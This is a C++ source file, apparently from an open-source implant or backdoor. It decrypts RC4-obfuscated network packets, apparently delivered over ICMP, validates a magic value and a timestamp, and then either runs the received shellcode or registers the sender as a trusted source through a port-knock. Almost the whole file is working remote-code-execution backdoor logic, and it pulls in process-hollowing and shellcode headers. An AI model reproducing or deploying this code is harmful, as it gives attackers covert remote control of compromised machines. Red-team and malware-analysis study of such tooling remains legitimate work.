//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include <ws2tcpip.h>
#include "context.h"
#include "../shared/debug.h"
#include "../shared/process_hollowing.h"
#include "../shared/win32.h"
#include "../shared/rc4.h"
#include "../shared/shellcode.h"
#include "vr-config.h"
#include "payload.h"


bool handle_payload(context& ctx, uint8_t* data, unsigned len, void* userdata)
{
    if (len < sizeof(vr_payload))
        return false;

    auto* payload = reinterpret_cast<vr_payload*>(data);

    // deobfuscate
    rc4_ctx rc{};
    rc4_init(&rc, vr_shared_key);
    rc4_xor(&rc, (uint8_t*)payload, len);

    // entire packet is in network byte order
    payload->magic = ntohl(payload->magic);
    payload->timestamp = ntohl(payload->timestamp);

    if (payload->magic != payload_magic_v1)
        return false;

    if (ctx.payload_last_timestamp >= payload->timestamp)
        return false;

    ctx.payload_last_timestamp = payload->timestamp;

    switch (payload->action)
    {
    case payload_action_shellcode:
    {
        auto* shellcode = data + sizeof(vr_payload);
        unsigned shellcode_len = len - sizeof(vr_payload);
        shellcode_spawn(shellcode, shellcode_len);
        break;
    }
    case payload_action_knock:
    {
        sockaddr* addr = (sockaddr*)userdata;
        ctx.trusted_source.resize(45);
        void* addr_in = nullptr;
        if (addr->sa_family == AF_INET)
            addr_in = &((sockaddr_in*)addr)->sin_addr;
        else if (addr->sa_family == AF_INET6)
            addr_in = &((sockaddr_in6*)addr)->sin6_addr;
        if (addr_in)
            inet_ntop(addr->sa_family, addr_in, &ctx.trusted_source.at(0), ctx.trusted_source.size());
        break;
    }
    default:
        LOG_WARNING("Unknown icmp action %d", payload->action);
        return false;
    }

    return true;
}
